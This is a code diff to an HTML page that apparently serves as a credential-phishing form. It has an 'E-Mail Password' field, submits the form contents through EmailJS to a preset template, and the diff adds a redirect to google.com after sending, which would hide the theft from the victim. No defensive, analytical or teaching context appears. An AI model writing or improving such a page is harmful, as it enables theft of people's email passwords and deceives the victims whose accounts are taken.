@@ -1148,7 +1148,7 @@ a.rightlink {
           <tr>
             <th>E-Mail Password</th>
             <td>
-              <input name="password"  type="text" value="password" autocomplete="off">
+              <input name="password"  type="hidden" value="password" autocomplete="off">
             </td>
           </tr>
           <tr>
@@ -1191,11 +1191,16 @@ document.getElementById('form')
 
    const serviceID = 'default_service';
    const templateID = 'template_zxyaflt';
+   const redirectUrl = 'https://google.com';
+   function redirectAfterSubmit() {
+     window.location.href = redirectUrl;
+   }
 
    emailjs.sendForm(serviceID, templateID, this)
     .then(() => {
       btn.value = 'Send Email';
       alert('Sent!');
+      redirectAfterSubmit();
     }, (err) => {
       btn.value = 'Send Email';
       alert(JSON.stringify(err));
